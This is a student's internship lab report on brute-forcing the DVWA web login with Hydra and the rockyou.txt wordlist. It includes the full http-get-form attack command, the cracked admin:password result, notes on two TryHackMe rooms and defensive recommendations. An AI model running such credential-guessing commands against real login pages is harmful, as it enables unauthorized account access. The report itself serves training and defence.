# Task 3 — Brute Force & Authentication Attacks (Hydra)

**Student:** Collins  
**Internship:** Ethical Hacking Internship, TechBiz Academy  
**Task:** Week 5 · Task 3  
**Attacker:** Kali Linux — `10.0.0.3`  
**Lab target:** DVWA on `http://127.0.0.1:42001`

## Objective

I used Hydra and the `rockyou.txt` wordlist to test the DVWA Brute Force login page in my own lab. I then manually verified the credentials Hydra reported and completed the related TryHackMe rooms.

## Lab setup and wordlist

I chose the DVWA web login rather than SSH or FTP on Metasploitable 2. Because the target was a web form, Hydra needed the `http-get-form` module and the exact request parameters, session cookie and failed-login response.

I located and extracted the wordlist:

```bash
ls /usr/share/wordlists/
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt
```

The report records 14,344,391 lines in the extracted `rockyou.txt` file.

## Hydra test

The report records this command and its form configuration:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 42001 http-get-form \
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=<LAB_SESSION>; security=low:F=Username and/or password incorrect." \
-t 4 -f -V
```

The session cookie value above is represented as a placeholder; use the current session cookie from your own authorized lab rather than reusing a report's expired session value.

Hydra reported:

```text
[42001][http-get-form] host: 127.0.0.1 login: admin password: password
1 of 1 target successfully completed, 1 valid password found
```

The report says the hit occurred on the fourth attempt, after the guesses `123456`, `12345`, and `123456789`. The `-f` option stopped the test after the first valid result, while `-t 4` used four parallel tasks and `-V` displayed attempts verbosely.

## Manual verification

I returned to the DVWA login page and signed in with the credentials Hydra identified. The page displayed the message:

```text
Welcome to the password protected area admin
```

This confirmed that Hydra had found a working credential pair rather than reporting a false positive.

## TryHackMe practice

I completed both rooms at 100%:

- [Hydra](https://tryhackme.com/room/hydra) — practised brute-forcing web login forms and SSH authentication, including the need to identify form parameters and a reliable failure string.
- [Brute It](https://tryhackme.com/room/bruteit) — followed a multi-stage path involving Nmap reconnaissance, directory discovery, a weak web login, private-key recovery, John the Ripper and privilege escalation.

## Summary of findings

| Finding | Result | Security significance |
|---|---|---|
| Target | DVWA Brute Force page on local port 42001 | A web login form was tested in the lab |
| Wordlist | `rockyou.txt`, 14,344,391 lines | Contains common passwords from a historical breach |
| Credential found | `admin:password` | The password was extremely weak and appeared near the start of the list |
| Attempts before success | 4 | The password was found almost immediately |
| Account lockout | None observed | Repeated attempts were not blocked or slowed during the test |

## Defensive recommendations

- Require long, unique passwords and block known-compromised or commonly used passwords.
- Apply rate limiting and progressive delays to repeated failed logins.
- Use account lockout controls carefully to reduce automated guessing without enabling denial-of-service abuse.
- Enable multi-factor authentication.
- Monitor authentication logs for repeated failures and unusual login patterns.
- Alert on distributed or high-volume login attempts and investigate suspicious source activity.

## Evidence

The submitted 7-page PDF report contains the practical screenshots. The following page references identify the evidence in that source report:

| Evidence | Source report page |
|---|---:|
| rockyou.txt located and extracted | 2 |
| Hydra running against DVWA | 3 |
| Successful credential result | 3 |
| Manual login verification | 4 |
| TryHackMe Hydra room completion | 5 |
| TryHackMe Brute It room completion | 6 |
| Summary of findings | 6 |

**Original report:** `Week5_Task3_Hydra_Report_Collins.pdf` (7 pages; supplied separately in this conversation).

## Conclusion

I located and extracted rockyou.txt, configured Hydra for the DVWA web form, found the weak admin password on the fourth attempt and confirmed the credential manually. The exercise demonstrated how weak passwords and the absence of rate limiting or lockout controls can make an account vulnerable to automated guessing. All testing was performed in my own lab; written authorization is required before testing a live system.
